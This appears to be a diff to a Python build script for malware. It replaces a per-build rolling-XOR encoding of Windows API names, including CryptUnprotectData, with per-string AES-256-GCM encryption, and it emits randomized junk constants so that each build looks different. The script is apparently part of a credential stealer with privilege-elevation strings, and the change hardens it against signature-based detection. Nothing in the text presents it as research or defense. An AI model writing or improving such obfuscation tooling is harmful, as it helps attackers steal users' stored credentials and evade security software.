@@ -116,13 +116,8 @@ def generate_elev_strings() -> list:
     return []
 
 
-def _xor_enc_api(plaintext: bytes, key: u8, mul: u8) -> list:
-    """Reproduce the same rolling-XOR used by api.rs xor_dec at runtime."""
-    return [b ^ key ^ ((i & 0xFF) * mul & 0xFF) for i, b in enumerate(plaintext)]
-
-
-def generate_api_xor_constants(key: int, mul: int) -> list:
-    """Return list of (const_name, encoded_bytes) for api.rs."""
+def generate_api_aes_constants() -> list:
+    """Return list of (const_name, key, nonce, ciphertext) for api.rs — AES-256-GCM."""
     strings = [
         ("CRYPTUNPROTECTDATA_ENC", b"CryptUnprotectData"),
         ("LOCALFREE_ENC",          b"LocalFree"),
@@ -138,8 +133,9 @@ def generate_api_xor_constants(key: int, mul: int) -> list:
     ]
     result = []
     for name, plaintext in strings:
-        enc = _xor_enc_api(plaintext, key, mul)
-        result.append((name, len(plaintext), enc))
+        key = os.urandom(32)
+        ct, nonce = aes256gcm_encrypt(plaintext, key)
+        result.append((name, key, nonce, ct))
     return result
 
 
@@ -157,10 +153,8 @@ def generate_polymorphic_keys(output_dir: str):
     lib_strings = generate_lib_strings()
     elev_strings = generate_elev_strings()
 
-    # Per-build randomized XOR parameters for api.rs (rolling XOR key + multiplier)
-    api_xor_key = random.randint(1, 254)
-    api_xor_mul = random.randint(1, 254) | 1  # odd multiplier for full-period coverage
-    api_constants = generate_api_xor_constants(api_xor_key, api_xor_mul)
+    # Per-build AES-256-GCM constants for api.rs (replaces rolling-XOR)
+    api_constants = generate_api_aes_constants()
 
     # Per-build random junk constants (replace obvious magic numbers)
     junk_a = random.randint(0x10000000, 0xEFFFFFFF)
@@ -201,13 +195,12 @@ def generate_polymorphic_keys(output_dir: str):
         lines.append(format_const_slice(f"{name}_ENC", ct, pub=True))
     lines.append("")
 
-    # Emit rolling-XOR key constants used by api.rs
-    lines.append("// ===== api.rs rolling-XOR parameters =====")
-    lines.append(f"pub const API_XOR_KEY: u8 = 0x{api_xor_key:02X};")
-    lines.append(f"pub const API_XOR_MUL: u8 = 0x{api_xor_mul:02X};")
-    for name, length, enc in api_constants:
-        hex_bytes = ", ".join(f"0x{b:02X}" for b in enc)
-        lines.append(f"pub static {name}: [u8; {length}] = [{hex_bytes}];")
+    # Emit AES-256-GCM constants for api.rs (replaces rolling-XOR)
+    lines.append("// ===== api.rs AES-256-GCM string constants =====")
+    for name, key, nonce, ct in api_constants:
+        lines.append(format_const_array(f"{name}_KEY", key, pub=True))
+        lines.append(format_const_array(f"{name}_NONCE", nonce, pub=True))
+        lines.append(format_const_slice(f"{name}_CT", ct, pub=True))
     lines.append("")
 
     # Emit junk constants (randomized per build)
